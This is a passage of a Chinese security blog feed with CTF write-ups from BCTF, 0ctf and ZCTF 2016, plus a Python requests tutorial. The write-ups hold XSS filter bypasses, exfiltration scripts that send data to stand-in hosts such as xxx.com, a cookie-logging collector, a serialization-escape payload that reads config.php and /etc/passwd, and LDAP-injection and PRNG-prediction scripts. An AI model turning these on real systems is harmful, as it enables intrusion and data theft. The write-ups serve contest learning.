98s65,98s69,98s73,98s74,98s75,98s76,98s77,98s78,98s79,98s80,98s81,98s3,99s7,99s14,99s15,99s16,99s17,99s18,99s19,99s20,99s21,99s26,99s28,99s31,99s34,99s38,99s44,99s49,99s50,99s51,99s52,99s53,99s54,99s55,99s56,99s57,99s58,99s62,99s65,99s69,99s77,99s2,100s8,100s13,100s17,100s24,100s25,100s26,100s27,100s28,100s29,100s31,100s33,100s38,100s39,100s40,100s41,100s42,100s43,100s44,100s53,100s58,100s61,100s65,100s69,100s74,100s77,100s80,100s1,101s9,101s10,101s12,101s17,101s26,101s31,101s33,101s53,101s58,101s61,101s62,101s63,101s65,101s66,101s67,101s68,101s69,101s70,101s75,101s77,101s79,101s3,102s7,102s17,102s25,102s26,102s27,102s28,102s29,102s31,102s34,102s36,102s37,102s38,102s39,102s40,102s41,102s42,102s43,102s44,102s45,102s46,102s52,102s54,102s58,102s60,102s61,102s63,102s70,102s72,102s73,102s74,102s75,102s76,102s77,102s78,102s79,102s80,102s81,102s82,102s3,103s7,103s14,103s15,103s16,103s17,103s18,103s19,103s20,103s24,103s25,103s29,103s31,103s34,103s41,103s52,103s55,103s58,103s61,103s63,103s70,103s76,103s77,103s78,103s3,104s7,104s17,104s25,104s26,104s27,104s28,104s29,104s31,104s34,104s38,104s41,104s42,104s43,104s44,104s45,104s51,104s55,104s58,104s61,104s63,104s64,104s65,104s66,104s67,104s68,104s70,104s75,104s77,104s79,104s2,105s4,105s6,105s8,105s17,105s25,105s29,105s31,105s32,105s33,105s38,105s41,105s50,105s58,105s61,105s62,105s63,105s70,105s74,105s77,105s80,105s1,106s5,106s9,106s17,106s25,106s26,106s27,106s28,106s29,106s31,106s37,106s39,106s41,106s49,106s58,106s61,106s63,106s70,106s72,106s73,106s77,106s81,106s82,106s4,107s10,107s12,107s13,107s14,107s15,107s16,107s17,107s18,107s19,107s20,107s21,107s22,107s25,107s29,107s31,107s36,107s40,107s41,107s42,107s43,107s44,107s45,107s46,107s48,107s55,107s56,107s57,107s68,107s69,107s77,107s17,112s20,112s31,112s53,112s62,112s68,112s73,112s77,112s1,113s2,113s3,113s5,113s6,113s7,113s8,113s9,113s14,113s17,113s20,113s24,113s25,113s26,113s27,113s31,113s37,113s38,113s39,113s40,113s41,113s42,113s43,113s44,113s45,113s54,113s63,113s67,113s73,113s77,113s78,113s79,113s80,113s81,113s2,114s5,114s9,114s14,114s17,114s20,114s24,114s27,114s30,114s32,114s40,114s42,114s48,114s49,114s50,114s51,114s52,114s53,114s54,114s55,114s56,114s57,114s58,114s60,114s61,114s62,114s63,114s64,114s65,114s66,114s67,114s68,114s69,114s70,114s72,114s76,114s81,114s2,115s5,115s7,115s9,115s14,115s17,115s20,115s24,115s27,115s29,115s33,115s37,115s40,115s42,115s45,115s50,115s72,115s74,115s76,115s77,115s78,115s79,115s80,115s2,116s5,116s7,116s9,116s12,116s13,116s14,116s15,116s16,116s17,116s18,116s19,116s20,116s21,116s22,116s24,116s26,116s28,116s34,116s38,116s40,116s42,116s44,116s50,116s61,116s62,116s63,116s64,116s65,116s69,116s72,116s73,116s80,116s1,117s2,117s3,117s5,117s7,117s9,117s14,117s17,117s20,117s24,117s26,117s29,117s30,117s31,117s32,117s33,117s40,117s42,117s50,117s51,117s52,117s53,117s54,117s55,117s56,117s57,117s61,117s65,117s67,117s69,117s73,117s76,117s77,117s78,117s79,117s80,117s81,117s82,117s2,118s5,118s7,118s9,118s14,118s17,118s20,118s24,118s27,118s36,118s37,118s38,118s39,118s40,118s41,118s42,118s43,118s44,118s45,118s46,118s61,118s62,118s63,118s64,118s65,118s67,118s69,118s72,118s77,118s2,119s5,119s7,119s9,119s14,119s17,119s20,119s24,119s27,119s30,119s33,119s53,119s61,119s65,119s67,119s69,119s72,119s73,119s74,119s76,119s78,119s81,119s2,120s6,120s8,120s14,120s17,120s18,120s19,120s20,120s24,120s27,120s28,120s31,120s33,120s41,120s45,120s49,120s51,120s54,120s57,120s61,120s62,120s63,120s64,120s65,120s67,120s69,120s77,120s79,120s80,120s2,121s3,121s6,121s8,121s14,121s24,121s25,121s26,121s29,121s31,121s33,121s37,121s39,121s42,121s46,121s49,121s51,121s54,121s58,121s61,121s65,121s67,121s69,121s74,121s76,121s78,121s79,121s81,121s1,122s5,122s8,122s10,122s14,122s24,122s29,122s32,122s37,122s39,122s44,122s46,122s48,122s51,122s56,122s58,122s61,122s65,122s69,122s72,122s73,122s77,122s79,122s81,122s4,123s9,123s10,123s14,123s15,123s16,123s17,123s18,123s19,123s20,123s21,123s22,123s24,123s28,123s29,123s30,123s31,123s32,123s33,123s34,123s36,123s40,123s41,123s42,123s43,123s44,123s52,123s53,123s54,123s55,123s56,123s61,123s64,123s65,123s68,123s69,123s75,123s76,123s78,123s79,123'

if __name__ == '__main__':
    ls = data.split('s')
    c = Image.new("RGB",(200,200))
    for l in ls:
        q = l.find(",")
        c.putpixel([int(l[:q]),int(l[q+1:])],(255,255,255))
    c.show()
    c.save("c.png")
</code></pre>
<h3>Over</h3>
<p>Orz、这样会不会被打？</p>]]></description>
</item>
<item>
<title><![CDATA[BCTF 2016 Log for homework]]></title>
<pubDate>Wed, 23 Mar 2016 16:50:20 GMT</pubDate>
<link>http://www.virzz.com/2016_03_23_bctf_2016_log_for_homework</link>
<guid>http://www.virzz.com/2016_03_23_bctf_2016_log_for_homework</guid>
<description><![CDATA[<h1>BCTF 2016 Log for homework</h1>
<p><a href="http://104.199.137.82/">Homework</a></p>
<ul>
<li>hint1: source code can be leaked.</li>
<li>hint2: version control</li>
<li>hitn3: hack the server</li>
</ul>
<h2>0x00 Orz</h2>
<p>很遗憾这次的BCTF一个web都没完成、、web虐狗、、、心累</p>
<p>这里简单记录一下这道题目的挑战记录</p>
<h3>0x01 Get The Codes</h3>
<p>这道题确实很难、第一关的脑洞就已经放倒一片WEB狗了。</p>
<p>上传、留言、、、完全不知道是干什么的</p>
<p>直到放了第一个Hint。。。然而依旧没有什么卵用</p>
<p>各种备份.bak/.swp/./.~/.zip/.git/.svn/CVS都试了一下、、无果</p>
<p>坐等第二个Hint、明确了是版本控制工具泄漏源码、、、Orz，还是给跪</p>
<p>最后、无意中发现一篇文章<a href="http://www.wooyun.org/bugs/wooyun-2015-089887">迅雷某处敏感配置文件泄漏</a></p>
<p>其中有这样一段</p>
<pre><code>"ignore_regexes": [
   "\\.sublime-(project|workspace)", "sftp-config(-alt\\d?)?\\.json",
   "sftp-settings\\.json", "/venv/", "\\.svn", "\\.hg", "\\.git",
   "\\.bzr", "_darcs", "CVS", "\\.DS_Store", "Thumbs\\.db", "desktop\\.ini"
],
</code></pre>
<p>挨个试了一下发现了存在.hg目录</p>
<p>Google得到Mercurial这款工具、</p>
<p>安装、下载、成功获得代码</p>
<h2>0x02 Audit codes</h2>
<p>大概看了下代码结构及逻辑过程</p>
<p>只有/index.php和/admin/read.php可能存在漏洞</p>
<p><strong>index.php</strong></p>
<p>关键fifter函数stripStr()</p>
<pre><code>function stripStr($str) {
    $str=str_ireplace("'","",$str);
    $str=str_ireplace('"',"",$str);
    $str=str_ireplace('&amp;',"",$str);
    $str=str_ireplace('#',"",$str);
    $str=str_ireplace(';',"",$str);
    $str=str_ireplace(',',"",$str);
    $str=str_ireplace(':',"",$str);
    $str=str_ireplace('`',"",$str);
    $str=str_ireplace('(',"",$str);
    $str=str_ireplace(')',"",$str);
    $str=str_ireplace('[',"",$str);
    $str=str_ireplace(']',"",$str);
    $str=str_ireplace('\\',"",$str);
    $str=str_ireplace('\r',"",$str);
    $str=str_ireplace('\n',"",$str);
    $str=str_ireplace('\0',"",$str);
    do $str=str_ireplace("script","",$str,$count); while($count&gt;0);
    do $str=str_ireplace("iframe","",$str,$count); while($count&gt;0);
    do $str=str_ireplace("data","",$str,$count); while($count&gt;0);
    do $str=str_ireplace("\\x","",$str,$count); while($count&gt;0);
    do $str=str_ireplace("\\u","",$str,$count); while($count&gt;0);
    return $str;
}
</code></pre>
<p>这三个关键词script、iframe、data明确告诉这是关于XSS的漏洞、日了狗了又是XSS</p>
<p><strong>/admin/read.php</strong></p>
<p>逻辑限制</p>
<pre><code>$pass="b06e544c489e4c1313c0f0e15259435a";
if ( !isset($_COOKIE['pass']) || md5($_COOKIE['pass']) != $pass ) {
    die( 'Access Denied!' );
}
</code></pre>
<p>关键函数get_client_ip()</p>
<pre><code>$ip=get_client_ip();

function get_client_ip(){
    if (getenv("HTTP_CLIENT_IP") &amp;&amp; strcasecmp(getenv("HTTP_CLIENT_IP"), "unknown")){
        $ip = getenv("HTTP_CLIENT_IP");
    }else if (getenv("HTTP_X_FORWARDED_FOR") &amp;&amp; strcasecmp(getenv("HTTP_X_FORWARDED_FOR"), "unknown")){
        $ip = getenv("HTTP_X_FORWARDED_FOR");
    }else if (getenv("REMOTE_ADDR") &amp;&amp; strcasecmp(getenv("REMOTE_ADDR"), "unknown")){
        $ip = getenv("REMOTE_ADDR");
    }else if (isset($_SERVER['REMOTE_ADDR']) &amp;&amp; $_SERVER['REMOTE_ADDR'] &amp;&amp; strcasecmp($_SERVER['REMOTE_ADDR'], "unknown")){
        $ip = $_SERVER['REMOTE_ADDR'];
    }else{
            $ip = "unknown";
    }
    return($ip);
}

$sql = "UPDATE `test`.`message` SET `is_read` = '1', `operation_log_ip` ='".
    $ip."', `operation_log_ua` ='".ua."' WHERE `message`.`index` = '".$_GET['index']."';";
query($sql);
</code></pre>
<p>密码无法破解</p>
<p>我首先想到的就是通过XSS获取cookie 【<strong>结果毫无疑问，不是！！！</strong>】</p>
<p>第一步、我们要先X进去！</p>
<p>这个很好解决，虽然fiter把script替换了、然而还是很轻松绕过的</p>
<p>提交</p>
<pre><code>&lt;scrdataipt src//xxx.com/xss.js.php&gt;&lt;/scrdataipt&gt;
</code></pre>
<p>就你绕过fifter加载js让bot执行</p>
<p>然后利用xhr对/admin/read.php进行POST数据,并获取返回数据。</p>
<p>由于read.php页面记录了操作者的IP处出现了XFF漏洞、通过自定义XFF达到注入。</p>
<h3>xss.js.php</h3>
<pre><code>xhr=new XMLHttpRequest();
xhr.open("POST","http://104.199.137.82/admin/read.php?index=&lt;?=$i?&gt;",false);
xhr.setRequestHeader("X-Forwarded-For","&lt;?=$p?&gt;");
xhr.send();
r=xhr.responseText;
xhr.open("POST","http://xxx.com/get.php",true);
xhr.send("v="+escape(escape(r)));
</code></pre>
<p>当然、这里是有一个大坑的</p>
<p>如果BOT访问了read.php页面，把你提交的数据设置is_read之后就无法注入了</p>
<pre><code>if ( isset( $_GET['index'] ) &amp;&amp; preg_match( "/^[0-9a-zA-Z]{32}$/", $_GET['index'] ) ) { 
    $sql = "SELECT `index`, `is_read`, `img`, `content` FROM message WHERE `index` = '".$_GET['index']."'";
    $row=query($sql);
    if($row) {
        if($row[1]==='0'){
</code></pre>
<p>所以要抢先在BOT访问之前访问，这时候可以写一个延迟脚本延缓BOT的速度。。。</p>
<p>然后，就是拼手速和拼脚本功底的时候了、</p>
<p>利用update注入、得到你想要得到的、、、、</p>
<p>后面我也没做出来、、Orz</p>]]></description>
</item>
<item>
<title><![CDATA[0ctf 2016 部分 web writeup]]></title>
<pubDate>Mon, 14 Mar 2016 10:49:06 GMT</pubDate>
<link>http://www.virzz.com/2016_03_14_0ctf_2016_bufen_web_writeup</link>
<guid>http://www.virzz.com/2016_03_14_0ctf_2016_bufen_web_writeup</guid>
<description><![CDATA[<h1>0ctf 2016 部分 web writeup</h1>
<h2>monkey</h2>
<p>折腾最久就是这道题了，表示很无奈、、脑洞居然是DNS解析、、、给老外的送分题啊</p>
<p><a href="http://www.cloudxns.net/" title="http://www.cloudxns.net/">域名解析商</a></p>
<p>根据页面提示 <strong>$str so that (substr(md5($str), 0, 6) === 'c1da58')</strong>，果断跑数字，成功爆破，最后确定为7-9位左右</p>
<p>再根据提示<strong>What is Same Origin Policy?</strong>，明显的同源策略</p>
<p>先来一发ajax获取数据：</p>
<h3>js.php or js.html</h3>
<pre><code>&lt;script src="jquery.min.js"&gt;&lt;/script&gt;
&lt;script&gt;
function getdata(){
    $.ajax({
        type: "GET",
        url:'http://xxx.com:8080/secret',
        async: true,
        error: function(request) {
            getdata();
        },
        success: function(data) {
            $.get('http://yourdomain/get.php?data='+data);
        }
    });
}
getdata();
&lt;/script&gt;
</code></pre>
<p>再来一发get.php:</p>
<pre><code>&lt;?php
    $data = "get : ".urldecode(urldecode($_SERVER['QUERY_STRING']));
    $data .= "\r\npost : ".urldecode(urldecode(file_get_contents("php://input")));
    $data .= "\r\nip : ".$_SERVER["REMOTE_ADDR"];
    $data .= "\r\nREFERER : ".$_SERVER['HTTP_REFERER'];
    $data .= "\r\nHTTP_USER_AGENT : ".$_SERVER['HTTP_USER_AGENT'];
    $data .= "\r\nREQUEST_METHOD : ".$_SERVER['REQUEST_METHOD'];
    $data .= "\r\nCookies : ".implode(' ',$_COOKIES);
    if(strlen($data)&gt;10){
        file_put_contents("get.txt","### ".date("Y-m-d H:m:s")." ###\r\n".$data."\r\n", FILE_APPEND);
    }
?&gt;
</code></pre>
<p>最后来一发自动爆破并提交的py：</p>
<h3>monkey_poc.py</h3>
<pre><code>#!/bin/env python
#-*- encoding: utf-8 -*-

import md5
import os
import re
import time
import requests

def mx(str):
    m1 = md5.new()   
    m1.update(str)   
    return m1.hexdigest()

if __name__ == '__main__':
    r = requests.session()
    print 'start'
    g = r.get("http://202.120.7.200/index.php")
    m = re.search(r'\(substr\(md5\(\$str\), 0, 6\) === \'([1|2|3|4|5|6|7|8|9|0|a|b|c|d|e|f]{6})\'\)', g.content).group(1)
    print 'fucking ' + m
    for x in range(10000000,100000000):
        a = mx(str(x))[0:6]
        if a == m:
            print 'get string: ' + str(x)
            _data = {"task":str(x), "url":"http://xxx.com:8080/fuck.php?a="+str(x)}
            b = r.post("http://202.120.7.200/run.php",data=_data)
            print b.content
            break
    time.sleep(3)
    i = 120  
    while i:
        if i == 110:
            print ' Please change you dns'
        else:
            print i
        i = i-1
        time.sleep(1)
    print 'end'
</code></pre>
<p>拿起你的域名、、、找一个牛X的dns解析提供商</p>
<p>运行poc后，根据提示把域名A记录改为127.0.0.1</p>
<p>你的js.php或者js.html需要放在8080端口哦、、、Orz</p>
<p>拼手速+网速的时候到了</p>
<h2>rand_2</h2>
<p>题目源码</p>
<pre><code>&lt;?php
include('config.php');
session_start();

if($_SESSION['time'] &amp;&amp; time() - $_SESSION['time'] &gt; 60) {
    session_destroy();
    die('timeout');
} else {
    $_SESSION['time'] = time();
}

echo rand();
if (isset($_GET['go'])) {
    $_SESSION['rand'] = array();
    $i = 5;
    $d = '';
    while($i--){
        $r = (string)rand();
        $_SESSION['rand'][] = $r;
        $d .= $r;
    }
    echo md5($d);
} else if (isset($_GET['check'])) {
    if ($_GET['check'] === $_SESSION['rand']) {
        echo $flag;
    } else {
        echo 'die';
        session_destroy();
    }
} else {
    show_source(__FILE__);
}
</code></pre>
<p>由于<strong>$_GET['check'] === $_SESSION['rand']</strong>是<strong>===全等类型</strong>判断，目测无法绕过、脑洞必然在rand()</p>
<p>这方面没怎么研究、完全现学现卖、、疯狂地百度</p>
<p>参考文章 ： <a href="http://www.cnblogs.com/wgbs25673578/p/4873269.html" title="随机数产生原理">随机数产生原理</a></p>
<p>队友写的POC</p>
<h3>rand_2_poc.py</h3>
<pre><code>#!/bin/env python
#-*- encoding: utf-8 -*-

import requests

while True:
    r = requests.session()
    l = []
    # 获取50个随机rand值并存入list
    for i in range(50):
        response = r.get('http://202.120.7.202:8888/')
        l.append(int(response.content[:response.content.find('&lt;')]))
    #将$_SESSION['rand']这个数组写满5个随机数
    response = r.get('http://202.120.7.202:8888/?go')
    #获取将MD5之前的rand随机数存到list
    l.append(int(response.content[:-32]))
    url = 'http://202.120.7.202:8888/?'
    for i in range(5):
        end = len(l)
        #由随机数生成算法预测下一个随机数
        randNUM = (l[end-3]+l[end-31]) % 2147483648 
        l.append(randNUM)#将新生成的也加入到列表里
        #构造url 传入数组5个预测rand随机数
        url += 'check[]={}&amp;'.format(randNUM)
    response = r.get(url)#GET请求url 同时传入参数
    #如果输出不是 die 大功告成
    if 'die' not in response.content:
        print response.content
        break
</code></pre>
<h2>piapiapia</h2>
<p>下载源码、通读一遍。</p>
<p>大概可以知道这题的脑洞在于是更新个人资料。</p>
<p>并且，<strong>flag是在config.php中！</strong></p>
<p>在class.php中可以看到filter()过滤函数，update_profile()更新profile函数</p>
<pre><code>public function filter($string) {
    $escape = array('\'', '\\\\');
    $escape = '/' . implode('|', $escape) . '/';
    $string = preg_replace($escape, '_', $string);
    $safe = array('select', 'insert', 'update', 'delete', 'where');
    $safe = '/' . implode('|', $safe) . '/i';
    return preg_replace($safe, 'hacker', $string);
}
</code></pre>
<p><strong>可以知道'和\被替换成_，以及select、insert、update、delete和where被替换成hacker。</strong></p>
<pre><code>public function update_profile($username, $new_profile) {
    $username = parent::filter($username);
    $new_profile = parent::filter($new_profile);
    $where = "username = '$username'";
    return parent::update($this-&gt;table, 'profile', $new_profile, $where);
}
</code></pre>
<p><strong>所更新的资料都是被filter()过滤后的。</strong></p>
<p>在update.php中</p>
<pre><code>$user-&gt;update_profile($username, serialize($profile));
</code></pre>
<p><strong>更新的profile是警告序列化转换的。</strong></p>
<p>再往上看，用户输入的数据都是经过正则验证的，然而其中有这样一段代码</p>
<pre><code>if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) &gt; 10){
    die('Invalid nickname');
}
</code></pre>
<p>明显和另外两个变量，email和photo不同、此处必定是脑洞！！！</p>
<pre><code>int preg_match ( string $pattern , string $subject [, array &amp;$matches [, int $flags = 0 [, int $offset = 0 ]]] )
返回值
preg_match()返回 pattern 的匹配次数。   它的值将是0次（不匹配）或1次，因为preg_match()在第一次匹配后 将会停止搜索。
如果发生错误preg_match()返回 FALSE。
</code></pre>
<p><strong>如果发生错误preg_match()返回 FALSE。</strong></p>
<p>当我们输入数组的时候，必定会导致preg_match()返回FALSE，同时让数组长度&lt;10的很简单的，即可以提交<strong>nickname[]=playload</strong></p>
<p>我们提交nickname[]=xxx可以得到序列化语句：</p>
<pre><code>a:4:{s:5:"phone";s:11:"12345678901";s:5:"email";s:17:"email@email.email";s:8:"nickname";a:1:{i:0;s:3:"xxx";}s:5:"photo";s:39:"upload/0cc175b9c0f1b6a831c399e269772661";}
</code></pre>
<p>根据PHP <strong>unserialize()</strong>的特性（<em>这个是测试出来的</em>），解序列化一个完整序列化语句之后的字符串是会被无视掉的。例如：</p>
<pre><code>unserialize('a:1:{s:5:"phone";s:11:"12345678901";}')
</code></pre>
<p>等价于</p>
<pre><code>unserialize('a:1:{s:5:"phone";s:11:"12345678901";}xxxxxxxxxxxxxxxx')
</code></pre>
<p>所以、我们可以构造一个特殊的序列化语句，伪造一个photo路径，就像这样：</p>
<pre><code>a:4:{s:5:"phone";s:11:"12345678901";s:5:"email";s:17:"email@email.email";s:8:"nickname";a:1:{i:0;s:3:"xxx";}s:5:"photo";s:10:"config.php";}s:5:"photo";s:39:"upload/0cc175b9c0f1b6a831c399e269772661";}
</code></pre>
<p>但是，我们提交的nickname[]=xxx";}s:5:"photo";s:10:"config.php的时候，却是会得到：</p>
<pre><code>a:4:{s:5:"phone";s:11:"12345678901";s:5:"email";s:17:"email@email.email";s:8:"nickname";a:1:{i:0;s:34:"xxx";}s:5:"photo";s:10:"config.php";}s:5:"photo";s:39:"upload/0cc175b9c0f1b6a831c399e269772661";}
</code></pre>
<p>即</p>
<pre><code>a:1:{i:0;s:34:"xxx";}s:5:"photo";s:10:"config.php";}
</code></pre>
<p>我们需要逃逸<strong>";}s:5:"photo";s:10:"config.php</strong>这31个字符</p>
<p>这时、猛然发现filter()中，把where替换成hacker明显逃逸了一个字符。。。。。脑洞完全暴露</p>
<p>当 'where'<em>n+'";}s:5:"photo";s:10:"config.php' == 'hacker'</em>n 的时候，就可以成功逃逸</p>
<p>得到playload：</p>
<pre><code>wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";}s:5:"photo";s:10:"config.php
</code></pre>
<h3>piapiapia_poc.py</h3>
<pre><code>#!/bin/env python
#-*- encoding: utf-8 -*-

def getflag():
    playload = '";}s:5:"photo";s:10:"config.php'
    w = 'where'
    h = 'hacker'
    for i in range(100):
        if len(w*i +playload) == len(h*i):
            print 'Playload is :\r\n\t'+w*i +playload+'\r\n'
            break

def getpasswd():
    playload = '";}s:5:"photo";s:11:"/etc/passwd'
    w = 'where'
    h = 'hacker'
    for i in range(100):
        if len(w*i +playload) == len(h*i):
            print 'Playload is :\r\n\t'+w*i +playload+'\r\n'
            break

def getany(f):
    playload = '";}s:5:"photo";s:'+str(len(f))+':"'+f
    w = 'where'
    h = 'hacker'
    for i in range(100):
        if len(w*i +playload) == len(h*i):
            print 'Playload is :\r\n\t'+w*i +playload+'\r\n'
            break
    update(w*i +playload)

if __name__ == '__main__':
    print 'get flag playload:\r\n'
    getflag()
    print 'get /ect/passwd playload:\r\n'
    getpasswd()
    f = raw_input("Input filepath what your want to read:")
    getany(f)
</code></pre>]]></description>
</item>
<item>
<title><![CDATA[python的requests一些使用技巧]]></title>
<pubDate>Sat, 06 Feb 2016 23:05:36 GMT</pubDate>
<link>http://www.virzz.com/2016_02_06_some_use_techniques_to_pythons_requests</link>
<guid>http://www.virzz.com/2016_02_06_some_use_techniques_to_pythons_requests</guid>
<description><![CDATA[<p>最近用到不少requests库，发现确实很牛逼，urllib，urllib2都是渣渣。。鉴于本人记性不好，简单做一个MARK给自己、、、</p>
<h2>安装</h2>
<p><a href="http://cn.python-requests.org/en/latest/user/install.html#install" title="install">install</a></p>
<h2>发送无参数的get请求</h2>
<pre><code>&gt;&gt;&gt; r = requests.get('http://www.isecer.com/')
&gt;&gt;&gt; print r.text
{
  "args": {}, 
  "headers": {
    "Accept": "*/*", 
    "Accept-Encoding": "gzip, deflate", 
    "Connection": "close", 
    "Host": "httpbin.org", 
    "User-Agent": "python-requests/2.3.0 CPython/2.6.6 Windows/7", 
    "X-Request-Id": "8a28bbea-55cd-460b-bda3-f3427d66b700"
  }, 
  "origin": "124.192.129.84", 
  "url": "http://httpbin.org/get"
}
</code></pre>
<h2>发送带参数的get请求</h2>
<p>将key与value放入一个字典中，通过params参数来传递,其作用相当于urllib.urlencode</p>
<pre><code>&gt;&gt;&gt; import requests
&gt;&gt;&gt; pqyload = {'q':'杨彦星'}
&gt;&gt;&gt; r = requests.get('http://www.baidu.com/s',params = payload)
&gt;&gt;&gt; r.url
u'http://www.so.com/s?q=%E6%9D%A8%E5%BD%A6%E6%98%9F'
</code></pre>
<h2>发送post请求</h2>
<p>通过data参数来传递</p>
<pre><code>&gt;&gt;&gt; payload = {'s':'isecer'}
&gt;&gt;&gt; r = requests.post("http://www.isecer.com/", data=payload)
&gt;&gt;&gt; print r.text
{
  "args": {}, 
  "data": "", 
  "files": {}, 
  "form": {
    "s": "isecer", 
  }, 
  "headers": {
    "Accept": "*/*", 
    "Accept-Encoding": "gzip, deflate", 
    "Connection": "close", 
    "Content-Length": "19", 
    "Content-Type": "application/x-www-form-urlencoded", 
    "Host": "httpbin.org", 
    "User-Agent": "python-requests/2.3.0 CPython/2.6.6 Windows/7", 
  }, 
  "json": null, 
  "url": "http://www.isecer.com/"
}
&gt;&gt;&gt;
</code></pre>
<p>可以看到，post参数已经传到了form里,data不光可以接受字典类型的数据，还可以接受json等格式</p>
<pre><code>&gt;&gt;&gt; payload = {'s':'isecer'}
&gt;&gt;&gt; import json
&gt;&gt;&gt; r = requests.post('http://www.isecer.com/', data=json.dumps(payload))
</code></pre>
<h2>发送文件的post类型</h2>
<p>这个相当于向网站上传一张图片，文档等操作，这时要使用files参数</p>
<pre><code>&gt;&gt;&gt; url = 'http://www.isecer.com/'
&gt;&gt;&gt; files = {'file': open('test.png', 'rb')}
&gt;&gt;&gt; r = requests.post(url, files=files)
</code></pre>
<p><strong>定制headers，使用headers参数来传递</strong></p>
<pre><code>&gt;&gt;&gt; import json
&gt;&gt;&gt; url = 'https://api.github.com/some/endpoint'
&gt;&gt;&gt; payload = {'some': 'data'}
&gt;&gt;&gt; headers = {'content-type': 'application/json'}
&gt;&gt;&gt; r = requests.post(url, data=json.dumps(payload), headers=headers)
</code></pre>
<h2>响应内容</h2>
<h3>响应状态码</h3>
<pre><code>r = requests.get('http://www.isecer.com/')

print r.status_code
</code></pre>
<h3>响应头</h3>
<pre><code>&gt;&gt;&gt; print r.headers
{'content-length': '519', 'server': 'gunicorn/18.0', 'connection': 'keep-alive', 'date': 'Sun, 15 Jun 2014 14:19:52 GMT', 'access-control-allow-origin': '*', 'content-type': 'application/json'}
</code></pre>
<p>也可以取到这个个别的响应头用来做一些判断，这里的参数是不区分大小写的</p>
<pre><code>r.headers['Content-Type']

r.headers.get('Content-Type')
</code></pre>
<h3>响应内容</h3>
<pre><code>r.text

r.content
</code></pre>
<h2>获取响应中的cookies</h2>
<pre><code>&gt;&gt;&gt; r = requests.get('http://www.baidu.com')
&gt;&gt;&gt; r.cookies['BAIDUID']
'D5810267346AEFB0F25CB0D6D0E043E6:FG=1'
</code></pre>
<p>也可以自已定义请求的COOKIES</p>
<pre><code>&gt;&gt;&gt; url = 'http://www.isecer.com/'
&gt;&gt;&gt; cookies = {'cookies_are':'isecer'}
&gt;&gt;&gt; r = requests.get(url,cookies = cookies)
&gt;&gt;&gt; 
&gt;&gt;&gt; print r.text
{
  "cookies": {
    "cookies_are": "isecer"
  }
}
&gt;&gt;&gt;
</code></pre>
<p>cookies还有很多...</p>
<h2>使用timeout参数设置超时时间</h2>
<pre><code>&gt;&gt;&gt; requests.get('http://github.com', timeout=1)
&lt;Response [200]&gt;
</code></pre>
<p>如果将时间设置成非常小的数，如requests.get('http://github.com', timeout=0.001)，那么如果在timeout的时间内没有连接，那么将会抛出一个Timeout的异常</p>
<h2>访问中使用session</h2>
<p>先初始化一个session对象</p>
<pre><code>s = requests.Session()
</code></pre>
<p>然后使用这个session对象来进行访问</p>
<pre><code>r = s.post(url,data = user)
</code></pre>]]></description>
</item>
<item>
<title><![CDATA[渣渣也去围观ZCTF2016]]></title>
<pubDate>Sun, 24 Jan 2016 21:49:35 GMT</pubDate>
<link>http://www.virzz.com/2016_01_24_tony_also_went_to_play_zctf2016</link>
<guid>http://www.virzz.com/2016_01_24_tony_also_went_to_play_zctf2016</guid>
<description><![CDATA[<h1>渣渣也去围观ZCTF2016</h1>
<hr />
<h2>web150</h2>
<p>算是最简单的吧</p>
<p>提示sessionhint=ONYUY2JANZXXIIDGNFXEIILDIFZGKICQ</p>
<p>base32加密</p>
<p>用工具<em>http://emn178.github.io/online-tools/base32_decode.html</em>解密得到<strong>sqLi not finD!cAre P</strong></p>
<p>LDAP注入admin/*进入第二关</p>
<p>sessionhint=MNQW4IDZN52SAZTJNZSCA3LZEBSGK43DOJUXA5DJN5XD6===</p>
<p>can you find my description?（莫名其妙的提示，后面才发现如此重要~出题人逆天。。。）</p>
<p>OR注入:<strong>(|(uid=*search*)</strong></p>
<p>构造<strong>search=)(a=</strong> ==&gt; <strong>(|(uid=<em>(=)(x=</em>)</strong>得到</p>
<pre><code>0 admin
1 test
2 fl4g_is_here
</code></pre>
<p>根据提示，第二个参数为<strong>description</strong></p>
<p>继续构造search=test)(description=* 爆破得到FLAG</p>
<pre><code>#!/bin/env python
#-*- encoding: utf-8 -*-
#Author:Virink[Isecer]

import time
import urllib
import urllib2

url = 'http://120.24.18.206/search.php'
l = '_0123456789@ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz{}'
playload = "test)(description="

while True:
    for i in l:
        values = {'search':playload+i}
        data = urllib.urlencode(values)
        req = urllib2.Request(url, data)
        req.add_header('user-agent', 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0');
        req.add_header('cache-control', 'no-cache');
        req.add_header('accept', '*/*');
        req.add_header('Cookie', '你的');
        req.add_header('connection', 'keep-alive');
        req.add_header('Content-Type', 'application/x-www-form-urlencoded');
        response = urllib2.urlopen(req)
        resule = response.read()
        time.sleep(0.5);
        if (resule.find('fl4g_is_here') != -1):
            playload += i
            break;
    print playload[18:]
    if len(playload)&gt;59 or playload.find('}' != -1):
        break;
</code></pre>
<p><strong>zctf{303A61ACE0204A2D5F352771D6F1BBA2}</strong></p>
<h2>web100</h2>
<p>跑弱口令得到两个帐号</p>
<p>niubenben/123456789
zhangwei/123456</p>
<p>明显Cookie验证登陆</p>
<p>于是各种编码、各种加密</p>
<p>最后发现cookie格式为<strong>md5(序号+UTF-7(序号))</strong></p>
<p>md5(1+UTF-7(1))=cd53009e0df5b83529120a75f6f28bf6</p>
<p><strong>zctf{x3y7h_b00s}</strong></p>
<h2>web400</h2>
<p>提示WOOYUN的一个漏洞，SSRF</p>
<p>burp跑端口1-65535。。。结果端口为<strong>47001</strong></p>
<p>然而我放一边跑去、结果忘记了、、、结束了才发现、、、ORZ</p>
<h2>web500</h2>
<p>提示read.php~</p>
<pre><code>?&lt;?php  
$file=isset($_GET['file'])?$_GET['file']:'';
if(empty($file)){
exit('The file parameter is empty,Please input it');    
}

if( preg_match('/.php/',$_SERVER['QUERY_STRING']) &amp;&amp; is_file($file) ){
    die("The parameter is not allow contain .php,Please input safe data");
}

if( preg_match('/admin_index|\.\/|admin_xx_modify/i',$file) ){
    die('Error String!');
}

$realfile = 'aaaaaa/../'.$file;

$file1=fopen($realfile,"r");
header("Content-Type: application/octet-stream");
header("Accept-Ranges: bytes");
header("Accept-Length: ".filesize($realfile));
header("Content-Disposition: attachment; filename=$file");
echo fread($file1,filesize($realfile));
